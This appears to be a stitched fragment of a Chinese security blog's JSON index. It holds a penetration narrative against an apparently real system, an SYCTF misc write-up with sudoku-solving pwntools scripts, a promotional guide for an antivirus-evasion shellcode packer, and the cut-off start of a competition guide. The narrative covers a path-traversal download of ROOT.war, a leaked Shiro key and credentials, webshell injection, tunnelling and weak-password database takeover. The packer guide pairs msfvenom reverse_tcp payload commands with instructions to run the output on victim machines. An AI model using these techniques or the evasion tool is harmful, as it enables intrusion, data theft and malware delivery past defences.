无法将位于[/WEB-INF/classes/static/modeler/editor-app/img-kis/remove-bendpoint.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.742 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/img-kis/add-bendpoint.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.742 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/img-kis/icon-add-bendpoint.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.742 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/img-kis/icon-align-vertical-selected.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.743 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/img-kis/icon-remove-bendpoint.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.743 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/img-kis/icon-zoom-actual-selected.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.743 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/img-kis/icon-zoom-fit.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.744 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/libs/ui-utils.min-0.2.1.js]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.744 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/libs/jquery.autogrow-textarea.js]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.745 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/libs/update-helper.js]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.745 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/libs/prototype-1.7.3.js]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.745 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/libs/path_parser.js]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.745 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/libs/prototype-1.6.1.js]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.746 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/libs/mousetrap/1.6.0]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.746 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/libs/mousetrap/1.6.0/mousetrap-record.js]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.746 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/libs/mousetrap/1.6.0/mousetrap.min.js]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.747 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/libs/mousetrap/1.6.0/mousetrap.js]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.747 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/partials/stencil-item-template.html]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.747 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/partials/process-tree-list.html]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.748 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/partials/root-stencil-item-template.html]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.748 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/popups/unsaved-changes.html]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.749 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/popups/select-shape.html]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.749 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/popups/save-model.html]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.749 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/popups/define-data.html]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.749 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/popups/validate-model.html]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.750 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/popups/icon-template.html]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.750 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/stencilsets/bpmn2.0]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.750 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/stencilsets/cmmn1.1]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.751 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/stencilsets/xforms]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.751 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/stencilsets/bpmn2.0/icons]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.752 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/stencilsets/bpmn2.0/icons/activity]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:11.879 信息 [localhost-startStop-1] org.apache.jasper.servlet.TldScanner.scanJars 至少有一个JAR被扫描用于TLD但尚未包含TLD。 为此记录器启用调试日志记录，以获取已扫描但未在其中找到TLD的完整JAR列表。 在扫描期间跳过不需要的JAR可以缩短启动时间和JSP编译时间。\n24-May-2024 14:16:24.386 信息 [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployWAR web应用程序存档文件[/data/tomcat-8.5.100/webapps/ROOT.war]的部署已在[21,318]ms内完成\n24-May-2024 14:16:24.388 信息 [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory 把web 应用程序部署到目录 [/data/tomcat-8.5.100/webapps/manager]\n24-May-2024 14:16:24.420 信息 [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Web应用程序目录[/data/tomcat-8.5.100/webapps/manager]的部署已在[32]毫秒内完成\n24-May-2024 14:16:24.420 信息 [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory 把web 应用程序部署到目录 [/data/tomcat-8.5.100/webapps/docs]\n24-May-2024 14:16:24.433 信息 [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Web应用程序目录[/data/tomcat-8.5.100/webapps/docs]的部署已在[13]毫秒内完成\n24-May-2024 14:16:24.433 信息 [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory 把web 应用程序部署到目录 [/data/tomcat-8.5.100/webapps/host-manager]\n24-May-2024 14:16:24.451 信息 [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Web应用程序目录[/data/tomcat-8.5.100/webapps/host-manager]的部署已在[18]毫秒内完成\n24-May-2024 14:16:24.451 信息 [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory 把web 应用程序部署到目录 [/data/tomcat-8.5.100/webapps/examples]\n24-May-2024 14:16:24.585 信息 [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Web应用程序目录[/data/tomcat-8.5.100/webapps/examples]的部署已在[134]毫秒内完成\n24-May-2024 14:16:24.594 信息 [main] org.apache.coyote.AbstractProtocol.start 开始协议处理句柄[\"http-nio-8080\"]\n24-May-2024 14:16:24.614 信息 [main] org.apache.catalina.startup.Catalina.start Server startup in 21636 ms\n```\n\n\n直接就给了war包的路径/data/tomcat-8.5.100/webapps/ROOT.war（当时看到这个一刻就在想，当时咋就不试下ROOT.war呢？省了两个小时翻日志的垃圾时间）\n\n![](http://cdn.anyiblog.top/WriteUp/20240601/eMSKZ40Q9zc9MwHr1717179608.png)\n\n这个时候我已经在笑了hh。。\n\n构造url下载这个文件 大小有100多MB\n```\n/common/download/resource?resource=/profile/../../../../../../../data/tomcat-8.5.100/webapps/ROOT.war\n```\n![](http://cdn.anyiblog.top/WriteUp/20240601/diyC0FpsTpbXjMPN1717179608.png)\n\n\n然后解压到本地分析，其他路径都是编写类的java文件直接忽略不看，主要看这个路径\n\n```\n/ROOT/WEB-INF/classes\n```\n\n里面包含了配置、模板静态文件\n\n![](http://cdn.anyiblog.top/WriteUp/20240601/diopOinaGTYMtWf51717179608.png)\n\n\n\n# Getshell + 内网横向拿下3台机子\n\n这个时候找到application.yml和application-druid.yml ,里面就有我们千辛万苦想找的Shiro key了！！\n\n![](http://cdn.anyiblog.top/WriteUp/20240601/VdhMpAmsoBQqSLxh1717179608.png)\n\n然后还有数据库账号密码和SMTP邮箱账号密码\n![](http://cdn.anyiblog.top/WriteUp/20240601/Y0kjmJLoYvJ5xZb41717179609.png)\n![](http://cdn.anyiblog.top/WriteUp/20240601/dtFzyiqtX7f2ovDU1717179609.png)\n\n之后就是拿Shiro工具填上密钥一把梭！！这里要记得勾上 AES GCM 这个选项，否则会打不通。\n\n![](http://cdn.anyiblog.top/WriteUp/20240601/q5R6HF6pVuqo3bu81717179609.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240601/uGYXnTWs0szOtFIs1717179610.png)\n\n然后这个shiro工具刚好可以注入内存马，还可以注入Neo-regeorg马，建立socks5。这个时候先是注的冰蝎、然后再用Neo-regeorg代理个socks5出来\n![](http://cdn.anyiblog.top/WriteUp/20240601/wyzz1Aggb5F1jOnl1717179610.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240601/uzgZPdlThmTHp15u1717179610.png)\n\nNeo-regeorg:\n\n![](http://cdn.anyiblog.top/WriteUp/20240601/2s1qVmcHdK4Rxcga1717179610.png)\n\n这个机子是10.88.0.24，通过之前读日志能发现主内网IP段在10.10.103.0/24，所以这个时候用neo弄个socks5隧道，通过隧道去测试10.10.103.0/24网段\n\n然后再上传fscan扫那个网段，后面是扫出来2个mssql弱口令和1个mysql弱口令，mysql数据库里面藏着400w+的敏感信息。\n```\n[+] mssql:10.10.103.204:1433:sa 111111\n[+] mssql:10.10.103.34:1433:sa 111111\n[+] mysql:10.10.103.238:3306:root root@123\n```\n\n后面的内网渗透就不细讲了，该拿的机子拿拿内网就可以算打穿了，主要讲讲前面曲折的渗透过程。\n\n# **后续**\n\n后面查找了下logs路径下的文件：\n\n![](http://cdn.anyiblog.top/WriteUp/20240601/TNsLY7tnOQdyIXDk1717179611.png)\n看日志像是刚开起来的站没多久，所以会有页面默认密码填入的情况，加上注册接口开放。\n\n也正是这某个小系统的一个注册接口的开放，导致了整个内网被入侵。但没有测到那个日志文件我可能就会放弃了，所以渗透也需要看一点运气，99%的实力和1%的运气。\n\n狗运，无需多言！！渗透结束，下班！！！！","tags":["渗透"],"categories":["红队","实战渗透"]},{"title":"SYCTF2023 安洵杯全国精英赛 | Misc方向题解","url":"/2024/03/21/20230611/","content":"\n# 前言\n\n\n\n又是一个安洵杯！被师傅们狠狠带飞了，太强了！！\n\n![](http://cdn.anyiblog.top//common/202306110942632.png)\n\n我负责的misc方向，来贴下题解qwq\n\n杂项比较可惜的就是 `cancellation` 那题，搞到二维码了就是不会让图像更清晰点，不然A了 等官方wp来了学习一波。\n\n\n\n# sudoku_easy\n\n交互题 nc端口要求根据给出的数独来写一个解决后的数独。\n\n![](http://cdn.anyiblog.top//common/20230611084021.png)\n\n\n\n这题有一个bug就是level处这里只能输入数字，如果输入hard等字符串就会将多出的字符传到你的solve输入处，此时你怎么填写数独都是错误；题目问题 对输入参入的字符串不严谨。\n\n使用Python解密数独即可，可以用Chatgpt生成解密代码：\n\n![](http://cdn.anyiblog.top//common/20230611084411.png)\n\n\n\n剩下的就是用pwntools交互，循环发送的过程 最后interactive接收shell即可。\n\n## 脚本\n\n```python\nfrom pwn import *\n\n\ndef is_valid(board, row, col, num):\n    # 检查行是否合法\n    for i in range(9):\n        if board[row][i] == num:\n            return False\n\n    # 检查列是否合法\n    for i in range(9):\n        if board[i][col] == num:\n            return False\n\n    # 检查小九宫格是否合法\n    start_row = (row // 3) * 3\n    start_col = (col // 3) * 3\n    for i in range(3):\n        for j in range(3):\n            if board[start_row + i][start_col + j] == num:\n                return False\n\n    return True\n\n\ndef solve_sudoku(board):\n    for row in range(9):\n        for col in range(9):\n            if board[row][col] == 0:\n                for num in range(1, 10):\n                    if is_valid(board, row, col, num):\n                        board[row][col] = num\n                        if solve_sudoku(board):\n                            return True\n                        board[row][col] = 0  # 回溯\n                return False  # 所有数字都尝试过，没有找到合适的数字\n    return True\n\n\ndef print_sudoku(board):\n    a = ''\n    for row in range(9):\n        for col in range(9):\n            a += str(board[row][col])\n        a+='\\n'\n    return a.strip()\n\n\n\ncontext.log_level = 'debug'\n\np = remote('47.108.165.60',23479)\n\np.recv()\n\nfor i in range(7):\n    p.sendline('1')\n\n    p.recvuntil('Please select the level:')\n\n    p.sendline('5')\n\n    a = '---------------------\\nnow give me you solve:'\n    content = p.recvuntil(a).decode().split(a)[0][-130:]\n\n    sudoku = content.split('---------------------')[1]\n\n    sudoku = sudoku.strip()\n    sudoku = sudoku.split('\\n')\n    tmp = []\n    for sudo in sudoku:\n        a = [int(s) for s in sudo]\n        tmp.append(a)\n\n    if solve_sudoku(tmp):\n        result = print_sudoku(tmp)\n        log.info(result)\n        for line in result.split('\\n'):\n            p.send(line)\n    #content = p.recv().decode()\np.interactive()\n\n```\n\n运行得到shell输入`cat flag`得到flag\n\n## FLAG\n\n![](http://cdn.anyiblog.top//common/202306110847834.png)\n\n\n\nFLAG: `SYCTF{easy_97d4bfa31985_5UD0KUkuKu}`\n\n\n\n# 烦人的压缩包\n\n下载附件得到Zip压缩包\n\n\n\n![](http://cdn.anyiblog.top//common/202306110853706.png)\n\n\n\n需要密码，尝试修复伪加密 无果。\n\n爆破得到压缩包密码为 `645321`\n\n![](http://cdn.anyiblog.top//common/202306110854954.png)\n\n\n\n解压后得到 `hint.txt` `love.jpg`\n\nwinhex分析 `love.jpg` 在尾部数据发现PK文件头，说明存在隐写\n\n![](http://cdn.anyiblog.top//common/202306110855108.png)\n\n\n\n`binwalk` 分离图片，得到压缩包：\n\n\n\n![](http://cdn.anyiblog.top//common/202306110856622.png)\n\n\n\n打开发现会报CRC32错误\n\n![](http://cdn.anyiblog.top//common/202306110857077.png)\n\n\n\n尝试再次使用 `binwalk` 分离修复 PS:这里压缩包要binwalk修复一下再分离 不然出不了东西。\n\n![](http://cdn.anyiblog.top//common/202306110908421.png)\n\n\n\n得到修复好的flag.txt，打开发现是Ook加密，最后解密得到FLAG\n\n![](http://cdn.anyiblog.top/common/202306110908392.png)\n\n\n\nhttps://www.splitbrain.org/services/ook\n\n![](http://cdn.anyiblog.top/common/202306110908438.png)\n\n\n\n## FLAG\n\nFLAG: `SYC{Yxx_Say_Thank3Q_v3ry_much}`\n\n\n\n# sudoku_speedrun\n\n\n\n和上题数独库一样，不过这一道是要求在短时间内完成数独\n\n\n\n是一个9x9的格子，wsad操控当前位置，要移到0处，输入数字即可填写数字，最后完成之后就可以得到FLAG\n\n\n\n![](http://cdn.anyiblog.top//common/202306110917669.png)\n\n\n\n## 思路\n\n数独解密和交互与第一个数独库题思路一样，不同的就是要多一步移动格子。\n\n大体思路是采用遍历比较：\n\n先将9x9数独库用正则匹配出来，然后再解密把正确的数独得出。\n\n移动格子方面让正确的和原始的一行行遍历，同样的不管 不同的就根据当前是第x列添加对应的方向再补充对应的数字即可。\n\n同时会记录在这一行走了多少格子，在到下一行的时候默认再添加上同样数量的反方向和s就到下一行了。\n\n\n\n```python\ndef payload(r1,r2):\n    # r1 wrong r2 right\n    payloads = ''\n    for a in range(9):\n        lines = ''\n        logs = 0\n        alls = 0\n        for b in range(9):\n            if r1[a][b] != r2[a][b]:\n                if b == 0:\n                    lines += str(r2[a][b])\n                else:\n                    log_number = (b-logs)*\"d\"\n                    lines += log_number+str(r2[a][b])\n                    \n                    alls += (b-logs)\n                    logs = b\n        if a != 8:\n            lines += (alls)*\"a\" + 's'\n        payloads += lines\n    return payloads\n```\n\n由于输入的可以一行完成，那就直接把所有步骤加在一起最后传输过去即可。\n\n\n\n## 脚本\n\n```python\nfrom pwn import *\n\n\ndef is_valid(board, row, col, num):\n    # 检查行是否合法\n    for i in range(9):\n        if board[row][i] == num:\n            return False\n\n    # 检查列是否合法\n    for i in range(9):\n        if board[i][col] == num:\n            return False\n\n    # 检查小九宫格是否合法\n    start_row = (row // 3) * 3\n    start_col = (col // 3) * 3\n    for i in range(3):\n        for j in range(3):\n            if board[start_row + i][start_col + j] == num:\n                return False\n\n    return True\n\n\ndef solve_sudoku(board):\n    for row in range(9):\n        for col in range(9):\n            if board[row][col] == 0:\n                for num in range(1, 10):\n                    if is_valid(board, row, col, num):\n                        board[row][col] = num\n                        if solve_sudoku(board):\n                            return True\n                        board[row][col] = 0  # 回溯\n                return False  # 所有数字都尝试过，没有找到合适的数字\n    return True\n\n\ndef print_sudoku(board):\n    a = []\n    for row in range(9):\n        t = []\n        for col in range(9):\n            t.append(int(board[row][col]))\n        a.append(t)\n    return a\n\n\ndef payload(r1,r2):\n    # r1 wrong r2 right\n    payloads = ''\n    for a in range(9):\n        lines = ''\n        logs = 0\n        alls = 0\n        for b in range(9):\n            if r1[a][b] != r2[a][b]:\n                if b == 0:\n                    lines += str(r2[a][b])\n                else:\n                    log_number = (b-logs)*\"d\"\n                    lines += log_number+str(r2[a][b])\n                    \n                    alls += (b-logs)\n                    logs = b\n        if a != 8:\n            lines += (alls)*\"a\" + 's'\n        payloads += lines\n    return payloads\n\n\n\ndef decode(tmp):\n    if solve_sudoku(tmp):\n        result = print_sudoku(tmp)\n        return result\n\nimport re\n\n#context.log_level = 'debug'\n\np = remote('47.108.179.76',32892)\n\np.recvuntil('Please input')\n\np.sendline('1')\n\np.recvuntil('>')\n\np.sendline('7')\n\np.recvuntil(b'-------------------------')\n\ncontent = p.recv()\n\nlog.info(content.decode())\n\ndata = content.replace(b'\\x1b[1;32m',b'').replace(b'\\r\\n',b'').replace(b'\\x1b[0m',b'').replace(b'\\x1b[7;32m',b'').replace(b'-------------------------',b'')\nsudoku = []\n\nfor line in data.split(b'| |'):\n    t = [int(s) for s in line.replace(b'|',b'').replace(b' ',b'').decode()]\n    sudoku.append(t)\n\nr1 = str(sudoku)\n\nresult = decode(sudoku)\n\nr1 = eval(r1)\n\nshow = ''\nfor a in result:\n    for b in a:\n        show+=str(b)\n    show+='\\n'\nlog.info(show)\n\npayloads = payload(r1,result)\nlog.info(payloads)\n\np.sendline(payloads)\n\nwhile 1:\n    try:\n        content = p.recvline()\n        print(content)\n    except:\n        break\np.interactive()\n```\n\n\n\n\n\n## FLAG\n\n（靶机关闭了 贴下当时运行的flag）\n\n容器Bug hhh：\n\n![](http://cdn.anyiblog.top//common/202306110926426.png)","tags":["CTF","干货"],"categories":["刷题笔记","Writeup"]},{"title":"killEscaper Shellcode免杀生成器(Windows)","url":"/2024/03/21/20230608/","content":"\nGithub项目： https://github.com/Anyyy111/killEscaper\n\n声明：本工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担。\n\n## 0x01 介绍\n\n作者: Anyyy\n\n博客: https://www.anyiblog.top\n\n本文地址：https://www.anyiblog.top/2023/06/08/20230608/\n\nkillEscaper 是一个利用shellcode来制作免杀exe的工具，可结合渗透工具生成的shellcode二次转换exe，支持红队常用渗透工具CobaltStrike、metasploit等，测试可以绕过火绒、360等杀软，操作系统位数支持32、64位。\n\n当前处于测试阶段，任何问题欢迎向我发送邮件：anyiguys@qq.com 或向我提交issue\n\n工具**仅支持Windows 且python版本需为python3.x**\n\n\n\n## 0x02 安装\n\n项目拉取：\n\n```\ngit clone https://github.com/Anyyy111/killEscaper\n```\n\n模块安装：\n\n脚本调用的模块都是原生库，注意安装 **pyinstaller** 即可。\n\n```\npip install pyinstaller\n```\n\n并添加 **pyinstaller** 至系统环境变量。\n\n\n\n## 0x03 使用方法\n\n```python\n_    _ _ _ _____\n| | _(_) | | ____|___  ___ __ _ _ __   ___ _ __\n| |/ / | | |  _| / __|/ __/ _` | '_ \\ / _ \\ '__|\n|   <| | | | |___\\__ \\ (_| (_| | |_) |  __/ |\n|_|\\_\\_|_|_|_____|___/\\___\\__,_| .__/ \\___|_|\n                               |_|\n    @Title: killEscaper_ShellCode免杀生成器\n    @Author: Anyyy\n    @Blog: https://www.anyiblog.top/\n    @env：Windows系统、Python3\n\n\nusage: python killEscaper.py -a <32/64> -f <ShellCode File> -i <Icon file>\n\n使用说明：\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -a ARCH, --arch ARCH  shellcode对应的操作系统位数 默认为64位\n  -f FILE, --file FILE  任何包含shellcode的Payload文件 用于读取并生成\n  -i ICON, --icon ICON  exe的Icon图标\n  -c, --clean           清理output输出文件\n```\n\n\n\n- -f (--file)  **必要参数**，**指定任何包含shellcode的Payload文件，用于读取并生成**\n- -a (--arch)  可选参数，**shellcode对应的操作系统位数 默认为64位**\n- -i (--icon)  可选参数，**生成的exe的Icon图标**，程序默认图标为exeLogo.ico\n- -c (--clean) **清理output输出文件**，程序每次运行会在output生成exe文件，使用该参数可以直接清理\n\n\n\n### 使用案例\n\n根据shellcode生成64位的exe执行文件：\n\n```python\npython killescaper -f payload64.c #根据shellcode生成64位的exe执行文件\n```\n\n根据shellcode生成32位的exe执行文件：\n\n```python\npython killescaper -a 32 -f payload32.c #根据shellcode生成32位的exe执行文件\n```\n\n自定义图标：\n\n```python\npython killescaper -a 64 -f payload64.c -i logo.ico #生成一个以logo.ico为图标的exe执行文件\n```\n\n清理输出文件夹：\n\n```python\npython killescaper --clean #清理output/所有文件\n```\n\n\n\n### metasploit生成免杀\n\n只讲生成免杀的步骤，执行及如何返回监听请查看 **0x04 效果演示** 的视频。\n\n\n\n1.msfvenom生成shellcode\n\nx64:\n\n```\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=IP lport=PORT -f python -a x64 > shellcode.txt\n```\n\nx32:\n\n```\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=IP lport=PORT -f python -a x86 > shellcode.txt\n```\n\n![](http://cdn.anyiblog.top/product/killescaper/imgs/image-20230608161915527.png)\n\n2.将shellcode.txt复制到本地\n\n3.运行脚本生成exe\n\n```\npython killEscaper.py -a 64 -f shellcode.txt\n```\n\n![](http://cdn.anyiblog.top/product/killescaper/imgs/image-20230608162208863.png)\n\n4.运行成功后会复制到剪贴板，粘贴或在/output/文件夹找到可执行文件\n\n![](http://cdn.anyiblog.top/product/killescaper/imgs/image-20230608162330573.png)\n\n5.上传到肉鸡运行\n\n\n\n### CobaltStrike生成免杀\n\n只讲生成免杀的步骤，执行及如何返回监听请查看 **0x04 效果演示** 的视频。\n\n\n\n1.cs生成shellcode\n\nx64:\n\n![](http://cdn.anyiblog.top/product/killescaper/imgs/image-20230608162606208.png)\n\n![](http://cdn.anyiblog.top/product/killescaper/imgs/image-20230608162614396.png)\n\n\n\nx32:\n\n![](http://cdn.anyiblog.top/product/killescaper/imgs/image-20230608162606208.png)\n\n![](http://cdn.anyiblog.top/product/killescaper/imgs/image-20230608162648687.png)\n\noutput输出C、python都行。\n\n2.点击Generate到本地payload64.c\n\n3.运行脚本生成exe\n\n```\npython killEscaper.py -a 64 -f payload64.c\n```\n\n![](http://cdn.anyiblog.top/product/killescaper/imgs/image-20230608162208863.png)\n\n4.运行成功后会复制到剪贴板，粘贴或在/output/文件夹找到可执行文件\n\n![](http://cdn.anyiblog.top/product/killescaper/imgs/image-20230608162330573.png)\n\n5.上传到肉鸡运行\n\n\n\n## 0x04 效果演示\n\nCobaltStrike免杀上线：\n\n<video src=\"http://cdn.anyiblog.top/product/killescaper/video/killEscaper%E6%BC%94%E7%A4%BA_cs.mp4\" controls=\"controls\" width=100% height=auto></video>\n\n\n\nKali msf免杀上线：\n\n<video src=\"http://cdn.anyiblog.top/product/killescaper/video/killEscaper%E6%BC%94%E7%A4%BA_msf.mp4\" controls=\"controls\" width=100% height=auto></video>\n\n\n\nvirustotal分析指数：\n\n![](http://cdn.anyiblog.top/product/killescaper/imgs/QQ%E6%88%AA%E5%9B%BE20230608160113.png)\n\n\n\n## 0x05 原理\n\n程序会将shellcode进行加密，会生成cipher密文和key密钥，密文和密钥每次生成都不同。\n\n模板中定义了解密模块，需要对应的密文密钥才能解密，再将解密后的Payload执行，即执行恶意shellcode返回至监听的cs或msf。\n\n模板写好后再写到python文件中，利用pyinstaller打包成exe，算法绕过了杀软的检测 同时执行shellcode，便成功实现了免杀执行。\n\n算法部分参考免杀工具 **BypassAV** 的算法并进行了优化。\n\n## 0x06 存活日志\n\n免杀这个东西，用的人越多越容易失效，主要是开源给大家学习下。\n\n我打算每次更新的时候就更新下日志，等到失效那一天hhh\n\n师傅们点点Star支持下~~\n\n```\n2023.06.08 —— 360、火绒绕过。\n```\n\n\n\n","tags":["干货","开发","渗透"],"categories":["开发","killEscaper"]},{"title":"中职网络安全赛项-B模块综合详细题解","url":"/2024/03/14/20240314/","content":"## 前言\n\n***如需转载请联系作者，否则侵权处理**\n\n本文于2023.03月整理，全文约40w字，由本人与学弟共同协作。\n\n因中职网络安全赛项于2023年取消，故将此前整理的详细wp进行公布学习。\n\n中职常见的类型题目这里都很详细的进行了分析，包括CTF、渗透等。\n\n## Web渗透题\n\n### *数据库服务渗透测试（sql注入+sqlmap）\n\n任务环境说明：\n\t服务器场景：Server2101\n\t服务器场景操作系统：未知（关闭连接）\n\n#### 